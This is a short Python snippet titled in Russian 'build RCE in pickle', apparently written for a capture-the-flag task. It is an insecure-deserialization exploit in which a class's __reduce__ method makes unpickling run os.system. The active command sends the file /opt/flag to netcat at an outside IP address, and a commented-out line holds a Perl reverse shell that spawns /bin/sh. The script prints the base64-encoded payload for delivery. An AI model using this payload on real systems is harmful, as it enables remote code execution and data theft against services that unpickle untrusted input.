Собрать RCE в pickle

```python
import pickle
import base64
import subprocess
import os


class User:
    def __init__(self, login, password):
        self.login = login
        self.password = password
        self.role = 'user'

    def __reduce__(self):
        #        return (os.system, (('perl -e \'use Socket;$i="127.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\''),))
        return(os.system, (('cat /opt/flag | /usr/bin/nc -nv 163.172.144.31 1234'),))


S = base64.b64encode(pickle.dumps(User('shtrikh17', 'test')))
print(S.decode('utf-8')) 
```
